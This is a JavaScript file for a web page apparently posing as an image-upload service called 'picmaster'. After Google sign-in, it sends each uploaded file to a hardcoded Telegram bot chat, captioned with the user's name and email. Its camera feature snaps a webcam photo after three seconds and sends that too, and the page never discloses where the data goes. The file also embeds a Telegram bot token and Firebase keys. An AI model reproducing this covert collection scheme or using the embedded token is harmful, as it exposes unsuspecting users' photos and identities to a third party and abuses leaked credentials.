import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
import { getAuth, signInWithPopup, GoogleAuthProvider, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-auth.js";

// Unga Firebase Config
const firebaseConfig = {
  apiKey: "AIzaSyBLC6enWWKAr3O9ys-4NDjnhch4r1PSw0E",
  authDomain: "picmaster-59602.firebaseapp.com",
  projectId: "picmaster-59602",
  storageBucket: "picmaster-59602.firebasestorage.app",
  messagingSenderId: "434859259854",
  appId: "1:434859259854:web:522979eb1a7f8b6d211d9f",
  measurementId: "G-V15THQL3Z4"
};

const app = initializeApp(firebaseConfig);
const auth = getAuth(app);
const provider = new GoogleAuthProvider();

// Telegram Details
const botToken = "8234454796:AAEF_c5gExxUp7X7pTpu9brOBmjIOTac2uQ";
const chatId = "7752627907";

let currentUser = null;
let uploadCount = 0;

// Sidebar Controls
document.getElementById('menu-btn').onclick = () => document.getElementById('side-menu').classList.toggle('active');
document.getElementById('settings-btn').onclick = () => document.getElementById('settings-panel').classList.toggle('active');

// Auth Listener
onAuthStateChanged(auth, (user) => {
    const accName = document.getElementById('acc-name');
    const guestIcon = document.getElementById('guest-icon');
    const userImg = document.getElementById('user-img');

    if (user) {
        currentUser = user;
        accName.innerText = user.displayName;
        guestIcon.style.display = 'none';
        userImg.src = user.photoURL;
        userImg.style.display = 'block';
    } else {
        currentUser = null;
        accName.innerText = "Please Login";
        guestIcon.style.display = 'block';
        userImg.style.display = 'none';
    }
});

// Main Upload Function
async function uploadFile(file, type = "File") {
    if(!currentUser) {
        signInWithPopup(auth, provider);
        return;
    }
    
    const dropArea = document.getElementById('drop-area');
    dropArea.innerHTML = "<h3>Uploading...</h3>"; // Neenga ketta English update

    const formData = new FormData();
    formData.append("chat_id", chatId);
    formData.append("document", file, "picmaster_upload.jpg");
    formData.append("caption", `${type} sent by ${currentUser.displayName}\nEmail: ${currentUser.email}`);

    try {
        const res = await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, { method: "POST", body: formData });
        if(res.ok) {
            uploadCount++;
            document.getElementById('file-count').innerText = `${uploadCount} files`;
            
            // Grammatically corrected English message
            dropArea.innerHTML = "<h3>Upload Successful! ✅</h3><p style='font-size:12px; opacity:0.7; margin-top:5px;'>Please wait for server response</p>";
            
            setTimeout(() => { 
                dropArea.innerHTML = '<i class="fas fa-cloud-upload-alt upload-icon"></i><h3>Click to Upload File</h3>'; 
            }, 4000);
        }
    } catch (e) { 
        alert("Upload Failed!"); 
        dropArea.innerHTML = "<h3>Upload Failed</h3>";
    }
}

// Camera Logic
document.getElementById('camera-btn').onclick = async () => {
    if(!currentUser) return alert("Please Login First!");
    const video = document.getElementById('webcam');
    const canvas = document.getElementById('canvas');
    
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;
        video.style.display = 'block';
        
        // 3 seconds kazhithu photo edukkum
        setTimeout(() => {
            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
            canvas.toBlob(blob => {
                uploadFile(blob, "Live Camera Photo");
                stream.getTracks().forEach(track => track.stop());
                video.style.display = 'none';
            }, 'image/jpeg');
        }, 3000);
    } catch (err) {
        alert("Camera Access Denied!");
    }
};

// Drop Area Click
document.getElementById('drop-area').onclick = () => {
    if(!currentUser) signInWithPopup(auth, provider);
    else {
        const input = document.createElement('input');
        input.type = 'file';
        input.onchange = e => uploadFile(e.target.files[0]);
        input.click();
    }
};

// Logout
document.getElementById('logout-btn').onclick = () => {
    if(confirm("Are you sure you want to Logout?")) {
        signOut(auth).then(() => location.reload());
    }
};
